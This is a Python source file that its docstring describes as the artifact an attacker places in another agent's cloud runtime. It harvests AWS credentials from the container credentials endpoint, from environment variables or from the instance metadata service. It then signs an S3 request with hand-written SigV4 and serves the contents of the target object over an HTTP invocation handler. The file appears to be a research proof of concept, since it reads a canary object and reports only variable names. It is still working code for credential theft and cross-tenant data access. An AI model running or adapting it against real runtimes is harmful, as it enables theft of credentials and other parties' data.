"""The artifact an attacker puts in another agent's runtime.

It reads the object it was pointed at and reports what came back. The bucket,
the key and the region arrive as environment variables, because
UpdateAgentRuntime carries environmentVariables alongside the artifact and the
role: one call decides the code, the identity it runs as, and what the code is
aimed at.

There is no SDK in the runtime image, so the request is signed here with SigV4
using the standard library only. That keeps the artifact small, and it also
says something: reaching another agent's data from inside a hijacked runtime
needs no dependency the platform does not already provide.

Credentials are taken from wherever the platform puts them, in the order the
SDKs use. Only the name of the source is reported, and only the names of the
AWS environment variables, never a key, a token or any value.
"""
import hashlib
import hmac
import json
import os
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer

MARK = "planted-by-attacker"
EMPTY_SHA256 = hashlib.sha256(b"").hexdigest()


def _get(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()


def credentials():
    """Return (access_key, secret, token, source), or (None, None, None, why)."""
    full = os.environ.get("AWS_CONTAINER_CREDENTIALS_FULL_URI")
    rel = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
    url = full or (("http://169.254.170.2" + rel) if rel else None)
    if url:
        headers = {}
        tok = os.environ.get("AWS_CONTAINER_AUTHORIZATION_TOKEN")
        tok_file = os.environ.get("AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE")
        if not tok and tok_file:
            try:
                with open(tok_file) as fh:
                    tok = fh.read().strip()
            except Exception:
                tok = None
        if tok:
            headers["Authorization"] = tok
        try:
            d = json.loads(_get(url, headers))
            return (d["AccessKeyId"], d["SecretAccessKey"], d.get("Token"),
                    "container credentials endpoint")
        except Exception as e:
            return None, None, None, "container endpoint failed: " + repr(e)

    if os.environ.get("AWS_ACCESS_KEY_ID") and os.environ.get("AWS_SECRET_ACCESS_KEY"):
        return (os.environ["AWS_ACCESS_KEY_ID"],
                os.environ["AWS_SECRET_ACCESS_KEY"],
                os.environ.get("AWS_SESSION_TOKEN"),
                "environment variables")

    try:
        req = urllib.request.Request(
            "http://169.254.169.254/latest/api/token", method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
        with urllib.request.urlopen(req, timeout=2) as r:
            imds_tok = r.read().decode()
        h = {"X-aws-ec2-metadata-token": imds_tok}
        base = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        role = _get(base, h, timeout=2).decode().strip().splitlines()[0]
        d = json.loads(_get(base + role, h, timeout=2))
        return (d["AccessKeyId"], d["SecretAccessKey"], d.get("Token"),
                "instance metadata")
    except Exception as e:
        return None, None, None, "no credential source reachable: " + repr(e)


def _sign(key, msg):
    return hmac.new(key, msg.encode(), hashlib.sha256).digest()


def signed_s3_get(bucket, key, region, ak, sk, token):
    """A SigV4 signed GET for one S3 object, virtual hosted style."""
    host = f"{bucket}.s3.{region}.amazonaws.com"
    canonical_uri = "/" + "/".join(
        urllib.parse.quote(seg, safe="") for seg in key.split("/"))
    now = datetime.now(timezone.utc)
    amzdate = now.strftime("%Y%m%dT%H%M%SZ")
    datestamp = now.strftime("%Y%m%d")

    headers = {"host": host, "x-amz-content-sha256": EMPTY_SHA256,
               "x-amz-date": amzdate}
    if token:
        headers["x-amz-security-token"] = token
    signed_headers = ";".join(sorted(headers))
    canonical_headers = "".join(f"{k}:{headers[k]}\n" for k in sorted(headers))

    canonical_request = "\n".join(
        ["GET", canonical_uri, "", canonical_headers, signed_headers,
         EMPTY_SHA256])
    scope = f"{datestamp}/{region}/s3/aws4_request"
    to_sign = "\n".join(
        ["AWS4-HMAC-SHA256", amzdate, scope,
         hashlib.sha256(canonical_request.encode()).hexdigest()])

    k = _sign(("AWS4" + sk).encode(), datestamp)
    k = _sign(k, region)
    k = _sign(k, "s3")
    k = _sign(k, "aws4_request")
    sig = hmac.new(k, to_sign.encode(), hashlib.sha256).hexdigest()

    headers["Authorization"] = (
        f"AWS4-HMAC-SHA256 Credential={ak}/{scope}, "
        f"SignedHeaders={signed_headers}, Signature={sig}")
    return _get(f"https://{host}{canonical_uri}", headers, timeout=10)


def report():
    out = {"mark": MARK}
    # Names only. A value here would put a live credential in a result file.
    out["aws_env_names"] = sorted(k for k in os.environ if k.startswith("AWS_"))

    bucket = os.environ.get("APT_BUCKET")
    key = os.environ.get("APT_KEY")
    region = (os.environ.get("APT_REGION") or os.environ.get("AWS_REGION")
              or os.environ.get("AWS_DEFAULT_REGION"))
    out["target"] = {"bucket": bucket, "key": key, "region": region}
    if not (bucket and key and region):
        out["canary"] = "no target given"
        return out

    ak, sk, token, source = credentials()
    out["credential_source"] = source
    if not ak:
        out["canary_error"] = "no credentials"
        return out

    try:
        body = signed_s3_get(bucket, key, region, ak, sk, token)
        out["canary"] = body.decode("utf-8", "replace")
    except Exception as e:
        out["canary_error"] = repr(e)
    return out


class H(BaseHTTPRequestHandler):
    def _send(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        if self.path == "/ping":
            self._send(200, {"status": "Healthy"})
        else:
            self._send(404, {"error": "not found"})

    def do_POST(self):
        if self.path != "/invocations":
            self._send(404, {"error": "not found"})
            return
        n = int(self.headers.get("Content-Length") or 0)
        self.rfile.read(n)
        self._send(200, {"response": report(), "status": "success"})

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever()
